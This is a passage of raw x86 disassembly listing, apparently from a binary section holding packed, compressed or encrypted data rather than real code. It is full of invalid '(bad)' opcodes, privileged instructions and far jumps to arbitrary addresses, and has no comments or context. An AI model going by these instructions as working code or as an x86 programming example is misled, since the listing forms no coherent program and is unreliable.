  410a13:	fcom   QWORD PTR [ebp-0x1a]
  410a16:	loopne 0x4109e3
  410a18:	add    cl,bl
  410a1a:	jae    0x410a2d
  410a1c:	shr    DWORD PTR [ecx],1
  410a1e:	inc    ebp
  410a1f:	fimul  DWORD PTR ds:0x1013db97
  410a25:	test   al,0x32
  410a27:	jecxz  0x4109e9
  410a29:	sbb    dh,al
  410a2b:	and    DWORD PTR [esi+0x1016b100],esi
  410a31:	inc    ecx
  410a32:	sbb    BYTE PTR [esi-0x43],ah
  410a35:	xor    ecx,DWORD PTR [edi+0xc]
  410a38:	mov    ah,0xb9
  410a3a:	or     esp,DWORD PTR ds:0x5549003f
  410a40:	add    cl,0xc
  410a43:	or     bh,al
  410a45:	and    DWORD PTR [ecx],0x8ffff15
  410a4b:	(bad)  
  410a4c:	enter  0x1885,0xc
  410a50:	test   DWORD PTR [ebx+0x530014e1],edi
  410a56:	push   ecx
  410a57:	and    ecx,DWORD PTR [ebx-0x406a33b2]
  410a5d:	sbb    BYTE PTR [eax],al
  410a5f:	add    BYTE PTR [eax-0x2740ffee],bh
  410a65:	pop    ss
  410a66:	add    BYTE PTR [eax],al
  410a68:	push   ebp
  410a69:	loopne 0x410a6b
  410a6b:	push   ebp
  410a6c:	push   ecx
  410a6d:	daa    
  410a6e:	xor    eax,eax
  410a70:	popf   
  410a71:	adc    al,0x0
  410a73:	add    BYTE PTR [eax+0x4cc7288d],bl
  410a79:	adc    eax,DWORD PTR [eax]
  410a7b:	add    BYTE PTR [eax-0x277cffec],cl
  410a81:	adc    edi,DWORD PTR [ebx]
  410a83:	add    BYTE PTR [esp+edx*1-0x694b8e00],cl
  410a8a:	mov    edi,0x148c00
  410a8f:	sbb    DWORD PTR [ecx+0x5dfb2913],0x5e
  410a96:	mov    cl,BYTE PTR [esi-0x1ef84]
  410a9c:	shl    DWORD PTR [ecx],cl
  410a9e:	or     eax,0x24838ed7
  410aa4:	dec    esp
  410aa5:	adc    al,0x0
  410aa7:	mov    DWORD PTR [ecx],esi
  410aa9:	jns    0x410aa7
  410aab:	add    esi,DWORD PTR [ecx]
  410aad:	sti    
  410aae:	jl     0x410a4d
  410ab0:	xor    eax,0xb8000201
  410ab5:	(bad)  
  410ab6:	clc    
  410ab7:	add    esi,DWORD PTR [ecx]
  410ab9:	std    
  410aba:	jl     0x410af5
  410abc:	stos   BYTE PTR es:[edi],al
  410abd:	outs   dx,DWORD PTR ds:[esi]
  410abe:	adc    BYTE PTR [ecx+esi*1],al
  410ac1:	std    
  410ac2:	jp     0x410a59
  410ac4:	add    BYTE PTR [eax],al
  410ac6:	and    ecx,edi
  410ac8:	add    DWORD PTR [eax],eax
  410aca:	test   al,0x67
  410acc:	fadd   QWORD PTR [ebx]
  410ace:	xor    ebp,edi
  410ad0:	ja     0x410ada
  410ad2:	mov    eax,0xba1bddc1
  410ad7:	mov    ecx,0xf3a953dd
  410adc:	add    al,0x9e
  410ade:	cmp    eax,0x300001f9
  410ae3:	xchg   edi,eax
  410ae4:	adc    DWORD PTR [ecx+esi*1],eax
  410ae7:	std    
  410ae8:	mov    ecx,0x14213d88
  410aed:	mov    DWORD PTR ds:0xcf890c19,esi
  410af3:	stc    
  410af4:	std    
  410af5:	jmp    DWORD PTR [esi-0x6dc3a7c]
  410afb:	add    DWORD PTR [ebx+0xe],eax
  410afe:	scas   eax,DWORD PTR es:[edi]
  410aff:	retf   0xfffe
  410b02:	mov    cs,WORD PTR [eax-0x2790076]
  410b08:	add    DWORD PTR [ebx-0x7b3a1f0b],ecx
  410b0e:	jno    0x410b39
  410b10:	jmp    0xb841:0x9e0fd8a
  410b17:	inc    ecx
  410b18:	loopne 0x410b31
  410b1a:	mov    ch,0xb4
  410b1c:	mov    al,0x2c
  410b1e:	stos   BYTE PTR es:[edi],al
  410b1f:	sub    eax,esp
  410b21:	pop    edi
  410b22:	mov    edx,0x2d137514
  410b27:	adc    al,0xe7
  410b29:	fiadd  DWORD PTR [eax]
  410b2b:	add    dl,ch
  410b2d:	aaa    
  410b2e:	mov    bh,0xd1
  410b30:	stos   DWORD PTR es:[edi],eax
  410b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b32:	repz jmp FWORD PTR [esi]
  410b35:	(bad)  
  410b37:	rcl    BYTE PTR [edx+0x64],1
  410b3a:	cwde   
  410b3b:	jp     0x410ba7
  410b3d:	cmp    BYTE PTR [ebx+0x180f81d1],dl
  410b43:	xor    dl,0x23
  410b46:	ins    BYTE PTR es:[edi],dx
  410b47:	inc    ebx
  410b48:	aaa    
  410b49:	cwde   
  410b4a:	xchg   esp,eax
  410b4b:	(bad)  
  410b4c:	dec    BYTE PTR [esi]
  410b4e:	rol    edi,cl
  410b50:	push   edx
  410b51:	xor    BYTE PTR [ecx+edx*1-0x40348046],dl
  410b58:	mov    ebx,0xa9c3c367
  410b5d:	jg     0x410b2a
  410b5f:	xlat   BYTE PTR ds:[ebx]
  410b60:	test   eax,0xdbdbc367
  410b65:	cs jb  0x410b28
  410b68:	adc    ch,BYTE PTR [eax+0x72]
  410b6b:	jbe    0x410b8f
  410b6d:	sbb    bh,ah
  410b6f:	add    ecx,DWORD PTR [edx]
  410b71:	shl    DWORD PTR [edi],cl
  410b73:	rol    DWORD PTR [ecx],1
  410b75:	mov    eax,ds:0x6262e01b
  410b7a:	jb     0x410bb2
  410b7c:	xchg   esi,eax
  410b7d:	xchg   edx,eax
  410b7e:	mov    dl,0x25
  410b80:	xchg   edi,eax
  410b81:	call   0x2a4:0x935ae03b
  410b88:	mov    al,ss:0xe7eff45
  410b8e:	arpl   WORD PTR [esi+0x0],di
  410b91:	add    BYTE PTR [edx+0x18],dl
  410b94:	out    0x3,eax
  410b96:	jbe    0x410bef
  410b98:	retf   
  410b99:	rdtsc  
  410b9b:	adc    al,0xe7
  410b9d:	add    ebx,DWORD PTR [eax]
  410b9f:	pop    eax
  410ba0:	add    ch,cl
  410ba2:	jp     0x410b2b
  410ba4:	bound  ebp,QWORD PTR [edx+0x14]
  410ba7:	adc    al,0xd
  410ba9:	outs   dx,DWORD PTR ds:[esi]
  410baa:	arpl   WORD PTR [ecx],dx
  410bac:	add    cl,ch
  410bae:	dec    ebx
  410baf:	push   edx
  410bb0:	and    al,0x11
  410bb2:	cmp    al,0x92
  410bb4:	dec    eax
  410bb5:	jmp    0x1e06:0xad891432
  410bbc:	push   ebp
  410bbd:	adc    dh,BYTE PTR [edx+eiz*2+0x50]
  410bc1:	bound  ebx,QWORD PTR [edi-0xb]
  410bc4:	loop   0x410bfb
  410bc6:	push   esp
  410bc7:	push   cs
  410bc8:	mov    dh,BYTE PTR [ebp-0x47aaba1a]
  410bce:	jns    0x410baf
  410bd0:	mov    DWORD PTR [ecx],esi
  410bd2:	adc    eax,0x140ef5c1
  410bd7:	dec    edx
  410bd8:	shl    esi,0x5f
  410bdb:	xor    BYTE PTR [ecx],al
  410bdd:	jmp    0xcd85a514
  410be2:	retf   0x50
  410be5:	in     al,0x32
  410be7:	adc    al,0x7c
  410be9:	lock mov cl,0xe
  410bec:	add    ebp,esi
  410bee:	ds sbb al,0x1
  410bf1:	jmp    0x4c415b28
  410bf6:	add    BYTE PTR [eax],al
  410bf8:	xor    eax,0xb1f07c14
  410bfd:	push   cs
  410bfe:	add    ch,dh
  410c00:	push   ds
  410c01:	or     al,0x3
  410c03:	jmp    0x59da53a
  410c08:	jge    0x410ba4
  410c0a:	inc    esp
  410c0b:	int    0x76
  410c0d:	call   0xc2fe:0xd7ef596
  410c14:	icebp  
  410c15:	fwait
  410c16:	inc    esp
  410c17:	lds    edx,FWORD PTR [edx+0x55]
  410c1a:	push   eax
  410c1b:	add    ch,bl
  410c1d:	retf   
  410c1e:	add    BYTE PTR [ecx+0xa],dl
  410c21:	loop   0x410baf
  410c23:	inc    esp
  410c24:	lds    ecx,FWORD PTR fs:[ebp-0x75]
  410c28:	scas   al,BYTE PTR es:[edi]
  410c29:	sub    ecx,ebx
  410c2b:	cli    
  410c2c:	iret   
  410c2d:	aaa    
  410c2e:	mov    cl,BYTE PTR [esp+esi*1-0x10]
  410c32:	cmp    BYTE PTR [esp-0x28],cl
  410c36:	mov    WORD PTR [ebx+0x19],es
  410c39:	mov    al,BYTE PTR [ecx+0x24]
  410c3c:	or     al,0xde
  410c3e:	jns    0x410c79
  410c40:	mov    ds:0x4e8b4f62,eax
  410c45:	sub    DWORD PTR [ecx-0x9],eax
  410c48:	pop    edi
  410c49:	cmp    BYTE PTR [edx-0x772f0bb4],cl
  410c4f:	inc    esp
  410c50:	hlt    
  410c51:	in     al,dx
  410c52:	mov    al,BYTE PTR [esp+eiz*8-0x34]
  410c56:	dec    ebp
  410c57:	push   ecx
  410c58:	push   ebx
  410c59:	inc    edi
  410c5a:	in     eax,0x2f
  410c5c:	add    BYTE PTR [eax],al
  410c5e:	out    0x30,eax
  410c60:	dec    BYTE PTR [ebx+0x2b21ec8c]
  410c66:	adc    BYTE PTR [edi+eax*8],dl
  410c69:	mov    eax,0x38e28681
  410c6e:	out    0x3e,eax
  410c70:	sar    dl,1
  410c72:	inc    ebx
  410c73:	push   esi
  410c74:	shr    al,0xbf
  410c77:	adc    eax,0x9d48ebc2
  410c7c:	dec    ecx
  410c7d:	and    al,0x3c
  410c7f:	(bad)  
  410c80:	mov    cl,dh
  410c82:	sbb    BYTE PTR [esi],0xf5
  410c85:	(bad)  
  410c86:	fistp  WORD PTR [ecx+edx*2-0x2a62abdc]
  410c8d:	mov    edx,DWORD PTR [esp+edi*8+0x3d]
  410c91:	push   edx
  410c92:	cmp    BYTE PTR [ebp-0x52ce1735],bl
  410c98:	sbb    bh,dh
  410c9a:	outs   dx,BYTE PTR ds:[esi]
  410c9b:	sar    DWORD PTR [ecx],1
  410c9d:	mov    dh,BYTE PTR [edx-0x7f]
  410ca0:	shl    BYTE PTR [ebx],0xf9
  410ca3:	jae    0x410c2a
  410ca5:	loope  0x410cd9
  410ca7:	cli    
  410ca8:	inc    ebx
  410ca9:	ror    BYTE PTR [ecx-0x8],0x6
  410cad:	inc    esp
  410cae:	or     eax,0xbce7debf
  410cb3:	add    cl,BYTE PTR [ebx+0x43]
  410cb6:	or     eax,0x3100050f
  410cbb:	std    
  410cbc:	mov    dh,bh
  410cbe:	lahf   
  410cbf:	adc    eax,0x6bdb
  410cc4:	push   ebp
  410cc5:	mov    cl,0x9d
  410cc7:	das    
  410cc8:	stos   BYTE PTR es:[edi],al
  410cc9:	mov    cl,0xe5
  410ccb:	daa    
  410ccc:	lods   al,BYTE PTR fs:[esi]
  410cce:	mov    cs,ebp
  410cd0:	sbb    DWORD PTR [edx+ebx*1-0x2],esi
  410cd4:	inc    BYTE PTR [esi+0x766d23b8]
  410cda:	cmp    al,0x8a
  410cdc:	jne    0x410caf
  410cde:	rcl    DWORD PTR [ecx-0x7f],0x86
  410ce2:	push   edx
  410ce3:	out    0x8a,eax
  410ce5:	add    esp,DWORD PTR [ebx]
  410ce7:	(bad)  
  410ce8:	sbb    bh,BYTE PTR [esi]
  410cea:	lea    ebx,[ebx+0x15]
  410ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cee:	mov    al,ds:0xe839ee07
  410cf3:	adc    esi,DWORD PTR [eax]
  410cf5:	std    
  410cf6:	add    DWORD PTR [eax],eax
  410cf8:	lods   al,BYTE PTR ds:[esi]
  410cf9:	loop   0x410c93
  410cfb:	dec    esp
  410cfc:	push   0x2443e849
  410d01:	cmp    cl,BYTE PTR [ebp+0x1f1458d]
  410d07:	add    BYTE PTR [ebx],cl
  410d09:	cld    
  410d0a:	mov    dh,0x50
  410d0c:	mov    edx,0x829e29ab
  410d11:	adc    al,0xa6
  410d13:	and    ch,BYTE PTR [ebx-0x54383ca0]
  410d19:	in     al,dx
  410d1a:	(bad)  
  410d1b:	(bad)  
  410d1c:	adc    dl,BYTE PTR [ecx+edi*1-0x4c]
  410d20:	mov    ebx,0x64b08fda
  410d25:	or     edi,DWORD PTR [edi-0x72]
  410d28:	add    BYTE PTR [eax],al
  410d2a:	jmp    0x9d9e:0xe1b8bf2f
  410d31:	nop
  410d32:	jmp    0x5f01:0xda2be82b
  410d39:	and    bh,bl
  410d3b:	jmp    0x410d9f
  410d3d:	mov    edi,0xdcd6c52
  410d42:	out    dx,al
  410d43:	dec    edi
  410d44:	or     edi,eax
  410d46:	push   ds
  410d47:	or     ebp,eax
  410d49:	add    ecx,DWORD PTR [edx]
  410d4b:	pop    ds
  410d4c:	push   0xffffff9f
  410d4e:	push   edx
  410d4f:	and    bh,ah
  410d51:	adc    ch,BYTE PTR [ecx+ebx*8-0x68cefc16]
  410d58:	sbb    al,0x5
  410d5a:	es call 0xb762:0x14310442
  410d62:	adc    dh,BYTE PTR [edx+esi*2]
  410d65:	mov    DWORD PTR [edx+0x10],eax
  410d68:	out    0x3,eax
  410d6a:	mov    dl,0xd5
  410d6c:	cmc    
  410d6d:	mov    ah,0xb3
  410d6f:	(bad)  
  410d70:	jmp    0xea14c12b
  410d75:	mov    bl,0xad
  410d77:	push   edi
  410d78:	add    esp,eax
  410d7a:	popa   
  410d7b:	lahf   
  410d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d7d:	sub    al,0xbe
  410d7f:	or     al,0xcf
  410d81:	and    DWORD PTR [ebx+0x5bd40b4f],edi
  410d87:	push   eax
  410d88:	add    ebp,esp
  410d8a:	stos   DWORD PTR es:[edi],eax
  410d8b:	pop    edi
  410d8c:	add    BYTE PTR ds:0x64690000,cl
  410d92:	mov    DWORD PTR [edi-0x6ede7143],ebx
  410d98:	push   ds
  410d99:	add    dh,bh
  410d9b:	sahf   
  410d9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d9d:	loop   0x410d28
  410d9f:	sub    eax,0x39533259
  410da4:	mov    ah,0xd8
  410da6:	call   0xfe4b5442
  410dab:	shr    ch,cl
  410dad:	stos   DWORD PTR es:[edi],eax
  410dae:	or     DWORD PTR [ebx+0x62c21734],0xebf7d3f5
  410db8:	or     eax,0x1e43e83d
  410dbd:	or     bh,dh
  410dbf:	bound  ebp,QWORD PTR [ebp-0x62]
  410dc2:	inc    esp
  410dc3:	add    eax,0x72506115
  410dc8:	xor    ecx,0xffffffc9
  410dcb:	xor    al,0x50
  410dcd:	or     cl,BYTE PTR [edx+0x1df1c21]
  410dd3:	and    BYTE PTR [ebp-0x4],ah
  410dd6:	mov    ds:0xe8030372,al
  410ddb:	cmp    BYTE PTR [edi],dl
  410ddd:	sahf   
  410dde:	retf   0x1a28
  410de1:	sub    al,BYTE PTR [ecx]
  410de3:	and    esi,DWORD PTR [ebp+edx*2-0x23ca42dc]
  410dea:	cmp    DWORD PTR [eax],edx
  410dec:	mov    dh,0x11
  410dee:	lds    ebp,FWORD PTR [ebp-0x1700da2a]
  410df4:	add    BYTE PTR [eax],al
  410df6:	xor    dl,BYTE PTR [ebx+eax*4]
  410df9:	out    0x98,al
  410dfb:	xor    DWORD PTR [ecx],edi
  410dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dfe:	xchg   esi,eax
  410dff:	xor    eax,0x39993d89
  410e04:	push   eax
  410e05:	cmp    esi,DWORD PTR [edi+edx*8+0x222600e8]
  410e0c:	(bad)  
  410e0d:	jmp    DWORD PTR [ebx]
  410e0f:	dec    ebp
  410e10:	mov    al,BYTE PTR [esp+edi*1-0x8]
  410e14:	push   esp
  410e15:	push   eax
  410e16:	adc    esp,DWORD PTR [ebx-0x1b]
  410e19:	jg     0x410db8
  410e1b:	xor    al,0xfe
  410e1d:	cmp    esi,DWORD PTR [eax+0x24]
  410e20:	mov    WORD PTR [edx],es
  410e22:	pop    ebx
  410e23:	adc    eax,0xfc348300
  410e28:	adc    DWORD PTR [eax],eax
  410e2a:	addr16 xchg edx,eax
  410e2c:	test   BYTE PTR [edx],0x48
  410e2f:	adc    eax,0x245bfd81
  410e34:	mov    ss,esp
  410e36:	pop    eax
  410e37:	adc    eax,0xf1848b00
  410e3c:	sbb    eax,0x55f17c8b
  410e41:	mov    ebx,DWORD PTR [esi+0x18000201]
  410e47:	nop
  410e48:	sar    ch,0xb9
  410e4b:	(bad)  
  410e4c:	mov    edi,0xbd8fba03
  410e51:	add    ebp,DWORD PTR [eax+0x14244999]
  410e57:	(bad)  
  410e58:	mov    cl,dh
  410e5a:	add    BYTE PTR [eax],al
  410e5c:	and    BYTE PTR [esi-0xb],ch
  410e5f:	call   DWORD PTR [edi]
  410e61:	cwde   
  410e62:	inc    ecx
  410e63:	and    al,0x8
  410e65:	cwde   
  410e66:	push   ecx
  410e67:	and    al,0xfc
  410e69:	xchg   edi,eax
  410e6a:	pop    ecx
  410e6b:	and    al,0x0
  410e6d:	call   0x63a46134
  410e72:	dec    ebp
  410e73:	jl     0x410e72
  410e75:	cmp    al,0x21
  410e77:	cmc    
  410e78:	xlat   BYTE PTR ds:[ebx]
  410e79:	sub    BYTE PTR [ebx+edx*2+0x43],dl
  410e7d:	pop    edx
  410e7e:	mov    BYTE PTR [esp+ebp*1+0x4],al
  410e82:	out    0x17,al
  410e84:	xor    eax,ebp
  410e86:	sbb    eax,0xe826bafe
  410e8b:	and    ecx,DWORD PTR [edx-0x44]
  410e8e:	jnp    0x410e12
  410e90:	xchg   ebx,eax
  410e91:	std    
  410e92:	add    al,dl
  410e94:	mov    edx,0x33f843b2
  410e99:	(bad)  
  410e9a:	lock out 0x7e,eax
  410e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e9e:	sbb    eax,0x894ddcfe
  410ea3:	int    0xb8
  410ea5:	ss call 0x18ed67d6
  410eab:	(bad)  
  410eac:	pop    esi
  410ead:	test   DWORD PTR [edx+ecx*4-0x13],ecx
  410eb1:	into   
  410eb2:	in     eax,0x2a
  410eb4:	jns    0x410eb3
  410eb6:	dec    esp
  410eb7:	mov    bh,0x58
  410eb9:	pop    esp
  410eba:	mov    DWORD PTR ds:0xf9336346,ebp
  410ec0:	add    BYTE PTR [eax],al
  410ec2:	stos   BYTE PTR es:[edi],al
  410ec3:	inc    esp
  410ec4:	inc    ebx
  410ec5:	call   0x8a890918
  410eca:	ins    DWORD PTR es:[edi],dx
  410ecb:	adc    eax,ebx
  410ecd:	add    ch,cl
  410ecf:	adc    ch,BYTE PTR [ebx]
  410ed1:	jl     0x410efc
  410ed3:	cs enter 0x2523,0xfc
  410ed8:	add    DWORD PTR [eax],eax
  410eda:	xor    DWORD PTR [eax+0x1d],esi
  410edd:	jne    0x410f28
  410edf:	repnz dec eax
  410ee1:	jnp    0x410f30
  410ee3:	cmp    BYTE PTR [eax-0x5032dedd],0x8a
  410eea:	not    DWORD PTR ds:0xedef353
  410ef0:	mov    edi,edx
  410ef2:	stos   BYTE PTR es:[edi],al
  410ef3:	mov    cl,0xe5
  410ef5:	daa    
  410ef6:	lods   eax,DWORD PTR fs:[esi]
  410ef8:	mov    cl,ch
  410efa:	fstp   DWORD PTR [ebx+0x18]
  410efd:	(bad)  
  410efe:	mov    esi,0x273c2214
  410f03:	cwde   
  410f04:	add    al,0x2
  410f06:	xor    DWORD PTR [edx+ebp*2],edx
  410f09:	lahf   
  410f0a:	push   edx
  410f0b:	and    bh,ah
  410f0d:	push   cs
  410f0e:	mov    ah,0x2a
  410f10:	jmp    0x1bdc4018
  410f15:	call   0xef7a000
  410f1a:	lods   eax,DWORD PTR ds:[esi]
  410f1b:	jnp    0x410f05
  410f1d:	add    esi,DWORD PTR [ecx]
  410f1f:	xchg   ebx,eax
  410f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f21:	add    al,0x26
  410f23:	mov    ?,WORD PTR [edi]
  410f25:	add    eax,0x14310000
  410f2a:	bound  esi,QWORD PTR [edi+0x4e626012]
  410f30:	or     ebx,ebx
  410f32:	je     0x410f3b
  410f34:	sub    ecx,DWORD PTR [ebx-0x5a]
  410f37:	xchg   ebp,eax
  410f38:	xor    BYTE PTR [ebx+0x50bbb3ae],bl
  410f3e:	ret    
  410f3f:	test   DWORD PTR [ebx],0xa5b3bae7
  410f45:	pop    eax
  410f46:	add    esp,eax
  410f48:	sbb    DWORD PTR [ebx+0x308a8c25],0xfeea2c03
  410f52:	inc    esi
  410f53:	push   ds
  410f54:	pop    ecx
  410f55:	mov    BYTE PTR [ebx],al
  410f57:	fadd   DWORD PTR [eax+0x52b76240]
  410f5d:	inc    esp
  410f5e:	xchg   esi,eax
  410f5f:	mov    cl,0xab
  410f61:	aad    0xf
  410f63:	loopne 0x410f67
  410f65:	pop    es
  410f66:	pop    ds
  410f67:	mov    al,BYTE PTR [esi]
  410f69:	fwait
  410f6a:	stos   DWORD PTR es:[edi],eax
  410f6b:	out    0x1e,eax
  410f6d:	pop    edi
  410f6e:	mov    bh,0x8a
  410f70:	in     al,dx
  410f71:	sti    
  410f72:	aad    0x17
  410f74:	xlat   BYTE PTR ds:[ebx]
  410f75:	push   es
  410f76:	ret    
  410f77:	inc    edx
  410f78:	mov    ebx,0xbecd0067
  410f7d:	mov    BYTE PTR [eax],dl
  410f7f:	(bad)  
  410f80:	out    dx,al
  410f81:	xor    dh,BYTE PTR [eax]
  410f83:	jb     0x410ffe
  410f85:	xor    dh,BYTE PTR [eax+esi*2]
  410f88:	xor    DWORD PTR [edx],0x6038
  410f8e:	jmp    0x69a34bc5
  410f93:	xor    dl,BYTE PTR [eax]
  410f95:	push   ds
  410f96:	loopne 0x410fee
  410f98:	mov    DWORD PTR [edi-0x4910d1a3],ebp
  410f9e:	and    al,0x9a
  410fa0:	dec    esp
  410fa1:	add    eax,0x724f5d5d
  410fa6:	out    0x99,eax
  410fa8:	fcom   DWORD PTR [ecx-0x6901fdb6]
  410fae:	mov    cl,dl
  410fb0:	or     eax,0xfe06d45c
  410fb5:	jmp    0xd1657a63
  410fba:	imul   ebp,DWORD PTR [eax+0x1432ed24],0x62a81173
  410fc4:	and    al,0xfd
  410fc6:	test   eax,0xe5f92452
  410fcb:	arpl   WORD PTR [eax+0x62],dx
  410fce:	ja     0x410fbd
  410fd0:	repnz pop ecx
  410fd2:	cmp    al,0x6
  410fd4:	push   esp
  410fd5:	call   0x3a16:0xa587d7a9
  410fdc:	call   0xfe473010
  410fe1:	(bad)  
  410fe3:	xor    DWORD PTR [edx+ebp*8],esp
  410fe6:	push   0xffffff9a
  410fe8:	shl    DWORD PTR [eax+esi*8-0x2532b364],1
  410fef:	arpl   WORD PTR [ecx+0xd00001f],cx
  410ff5:	mov    ch,0xf1
  410ff7:	add    BYTE PTR [edi],ch
  410ff9:	daa    
  410ffa:	mov    bl,al
  410ffc:	inc    ebx
  410ffd:	fsub   QWORD PTR [ecx]
  410fff:	cmp    BYTE PTR [edi+0x30ce8ac1],ah
  411005:	jno    0x410ff9
  411007:	dec    edi
  411009:	pushf  
  41100a:	imul   esp,DWORD PTR [esp+edi*1],0x548bd813
  411011:	cld    
  411012:	and    DWORD PTR [ebx],edi
  411014:	retf   
  411015:	pushf  
  411016:	pop    ecx
  411017:	and    al,0x50
  411019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41101a:	dec    eax
  41101b:	jmp    0x410fb1
  41101d:	pushf  
  41101e:	pop    ecx
  41101f:	and    al,0x20
  411021:	fwait
  411022:	inc    ecx
  411023:	and    al,0x80
  411025:	in     al,dx
  411026:	and    DWORD PTR [esp+eax*4],0x11
  41102a:	add    BYTE PTR [ebp+0x61],dh
  41102d:	xchg   esp,eax
  41102e:	mov    ebx,0x115428
  411033:	add    BYTE PTR [ebx+ecx*1+0x3d],al
  411037:	add    BYTE PTR [ebp+0x11],al
  41103a:	add    BYTE PTR [ebp+edx*2-0x6c],bh
  41103e:	inc    BYTE PTR [edx]
  411040:	inc    esp
  411041:	repz cmp BYTE PTR [esp+esi*2-0x17],0xfd
  411047:	jl     0x411091
  411049:	adc    DWORD PTR [ebp+eax*1-0x65],edi
  41104d:	sub    BYTE PTR [edx],al
  41104f:	je     0x41107c
  411051:	pushf  
  411052:	dec    ecx
  411053:	and    al,0x40
  411055:	mov    edi,0x8b50
  41105a:	pop    esi
  41105b:	cmp    ebx,ecx
  41105d:	repz dec edi
  41105f:	sub    dl,ch
  411061:	xor    BYTE PTR [ebx-0x6ca7de3b],dl
  411067:	int    0x21
  411069:	adc    BYTE PTR [ebx-0x5528d5bc],al
  41106f:	ror    BYTE PTR [edx+0x6e1331ce],0xef
  411076:	ficom  WORD PTR ds:0xeb0d431c
  41107c:	sub    dh,0x30
  41107f:	and    BYTE PTR [ebx],0xea
  411082:	and    esi,DWORD PTR [edx-0x4b]
  411085:	and    esp,DWORD PTR [ecx]
  411087:	push   0x4960fec8
  41108c:	(bad)  
  41108d:	int    0x99
  41108f:	mov    BYTE PTR [esi+edi*8],dl
  411092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411093:	sub    DWORD PTR [ecx],ebx
  411095:	sbb    BYTE PTR [ecx+edi*8-0x54f70f6],0x1
  41109d:	add    BYTE PTR [edx+0x3103f06c],bh
  4110a3:	sti    
  4110a4:	mov    al,0x52
  4110a6:	loope  0x411119
  4110a8:	dec    edx
  4110a9:	out    0x17,eax
  4110ab:	stos   DWORD PTR es:[edi],eax
  4110ac:	sbb    esi,edi
  4110ae:	mov    edx,0xfc27e036
  4110b3:	dec    ebx
  4110b4:	(bad)  
  4110b5:	int    0xaa
  4110b7:	ret    0xef2c
  4110ba:	arpl   WORD PTR [ebp+0x3a19],cx
  4110c0:	jb     0x4110c7
  4110c2:	jmp    0xb73a:0xe9d6ed8a
  4110c9:	into   
  4110ca:	std    
  4110cb:	push   DWORD PTR [esi]
  4110cd:	out    0xc,eax
  4110cf:	sub    edi,0x25
  4110d2:	add    BYTE PTR [eax],al
  4110d4:	xor    ebp,ebp
  4110d6:	lea    eax,[esp+ebx*2-0x13]
  4110da:	add    BYTE PTR [eax],al
  4110dc:	xor    ecx,ebx
  4110de:	add    BYTE PTR [ebx+0x68df00c],al
  4110e4:	inc    esp
  4110e5:	in     eax,dx
  4110e6:	cwde   
  4110e7:	(bad)  
  4110e8:	(bad)  
  4110e9:	mov    cl,0xd3
  4110eb:	mov    dl,BYTE PTR [ebp+0x14]
  4110ee:	retf   
  4110ef:	mov    ebx,0xefc370b9
  4110f4:	lods   eax,DWORD PTR ds:[esi]
  4110f5:	icebp  
  4110f6:	fwait
  4110f7:	jecxz  0x4110a4
  4110f9:	stos   BYTE PTR es:[edi],al
  4110fa:	repz call esi
  4110fd:	add    ebx,DWORD PTR [ebx+0xfd2bbb5]
  411103:	in     eax,0xd6
  411105:	add    esi,edi
  411107:	pop    ebx
  411108:	xor    DWORD PTR [edi+eiz*8],edx
  41110b:	add    esi,DWORD PTR [eax]
  41110d:	call   0xc011:0x3aefffb
  411114:	push   edx
  411115:	sub    BYTE PTR [esp-0x53],bl
  411119:	pusha  
  41111a:	in     al,dx
  41111b:	sbb    cl,BYTE PTR [ebx+0x52b7725e]
  411121:	pop    esp
  411122:	jb     0x4110e3
  411124:	add    BYTE PTR [eax],al
  411126:	push   edx
  411127:	sub    al,0x1c
  411129:	mov    ah,0xab
  41112b:	sar    BYTE PTR [edi-0x58fc7dfa],cl
  411131:	add    al,0x9f
  411133:	sub    bl,ah
  411135:	add    esi,DWORD PTR [ecx]
  411137:	xchg   ecx,eax
  411138:	xor    edi,ecx
  41113a:	pop    edi
  41113b:	out    dx,eax
  41113c:	int3   
  41113d:	mov    ?,edx
  41113f:	aaa    
  411140:	pop    ds
  411141:	or     DWORD PTR [edi-0x77],0x37fa8ed5
  411148:	mov    edi,0xe328a48e
  41114d:	add    esi,DWORD PTR [ecx]
  41114f:	(bad)  
  411150:	rcr    edi,cl
  411152:	push   0xffffff8d
  411154:	stos   DWORD PTR es:[edi],eax
  411155:	fistp  WORD PTR [esi-0x73]
  411158:	mov    ebx,0x425b2edf
  41115d:	icebp  
  41115e:	lods   eax,DWORD PTR ds:[esi]
  41115f:	add    bh,BYTE PTR [esi+eax*1-0x7111108a]
  411166:	lods   al,BYTE PTR ds:[esi]
  411167:	daa    
  411168:	add    ch,ch
  41116a:	xor    dl,BYTE PTR [ecx+edx*2]
  41116d:	cdq    
  41116e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41116f:	shr    al,1
  411171:	pop    edi
  411172:	sbb    eax,DWORD PTR [edx]
  411174:	(bad)  
  411175:	push   ds
  411176:	mov    al,0x26
  411178:	add    al,0xe9
  41117a:	xor    bl,BYTE PTR [ecx-0x11a92103]
  411180:	add    cl,ch
  411182:	xor    bh,BYTE PTR [edi]
  411184:	jl     0x41114b
  411186:	ficom  WORD PTR [ecx]
  411188:	or     DWORD PTR [eax],0x0
  41118b:	add    BYTE PTR [edx],dh
  41118d:	adc    al,0x0
  41118f:	bound  eax,QWORD PTR [esi-0x78dabca]
  411195:	sub    eax,0xe316cc9
  41119a:	cmp    DWORD PTR [esi-0x5976eb3d],ebp
  4111a0:	fisttp QWORD PTR [ebp-0x727ef2bc]
  4111a6:	jmp    0x50a969bd
  4111ab:	imul   esi,DWORD PTR fs:[esi],0xd0a4183c
  4111b2:	xchg   DWORD PTR ds:0x17e83651,edx
  4111b8:	ss add bh,dh
  4111bb:	rol    dh,1
  4111bd:	ss xor al,0x1b
  4111c0:	or     DWORD PTR [ebp+0x6962cd54],0xfafb7252
  4111ca:	in     eax,0x78
  4111cc:	sbb    BYTE PTR [edx],al
  4111ce:	mov    al,BYTE PTR [ecx+0x212456a4]
  4111d4:	loopne 0x411227
  4111d6:	mov    DWORD PTR [edi],ebp
  4111d8:	push   ebp
  4111d9:	jmp    0x3e7968cd
  4111de:	ret    
  4111df:	(bad)  
  4111e0:	leave  
